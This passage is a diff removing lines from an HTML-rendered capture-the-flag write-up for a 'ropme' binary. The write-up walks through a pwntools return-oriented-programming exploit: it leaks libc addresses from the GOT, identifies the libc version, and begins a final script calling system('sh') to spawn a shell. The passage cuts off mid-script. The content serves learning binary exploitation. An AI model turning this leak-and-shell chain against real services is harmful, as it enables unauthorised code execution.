-&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cyclic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;# offset
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# pop rdi; ret
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# argument
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# function_call
-&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# pop rdi; ret
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# argument
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# function_call
-&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# return to main
-&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ROP me outside, how 'about dah?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;puts_address&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;fgets_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'puts() at %#x'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'fgets() at %#x'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fgets_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;its output :&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/ropme_leak_libc.png&quot; alt=&quot;ropme_leak_libc&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Now having this juicy information we can search for the libc version using one of the many libc databases out there an example would be : &lt;a href=&quot;https://libc.blukat.me&quot;&gt;libc-database&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/img/ropme_libc_found.png&quot; alt=&quot;ropme_libc_found&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;The remote target has &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc6_2.23&lt;/code&gt;, let’s just download it and use &lt;a href=&quot;https://docs.pwntools.com/en/stable&quot;&gt;pwntools&lt;/a&gt; to extract function’s offsets from it.&lt;/p&gt;
-
-&lt;h1 id=&quot;exploit-part&quot;&gt;Exploit part:&lt;/h1&gt;
-
-&lt;p&gt;Now that we can leak a libc function’s address we can calculate libc base address by : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc_base_address = leaked_function_address - function's_offset_in_libc&lt;/code&gt; and then get system address.&lt;/p&gt;
-
-&lt;p&gt;The final exploit script :&lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-45
-46
-47
-48
-49
-50
-51
-52
-&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./ropme'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'./libc6_2.23-0ubuntu10_amd64.so'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;pop_rdi_ret&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4006d3&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;puts_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'puts'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;sys_offset&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'system'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;exit_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'exit'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;sh_offset&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'127.0.0.1'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# connect to the remote service
-&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cyclic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;# offset
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# pop rdi; ret
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# argument
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# function_call
-&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# pop rdi; ret
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;got&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;c1&quot;&gt;# argument
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;     &lt;span class=&quot;c1&quot;&gt;# function_call
-&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# return to main
-&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ROP me outside, how 'about dah?&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leak&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;puts_address&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;fgets_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;().&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ljust&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'puts() at %#x'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'fgets() at %#x'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fgets_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;puts_offset&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;success&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'libc_base located at %#x'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys_offset&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sh_offset&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exit_offset&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cyclic&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;       &lt;span class=&quot;c1&quot;&gt;# offset
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pop_rdi_ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# pop rdi; ret
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sh&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;          &lt;span class=&quot;c1&quot;&gt;# argument
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;      &lt;span class=&quot;c1&quot;&gt;# function_call
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
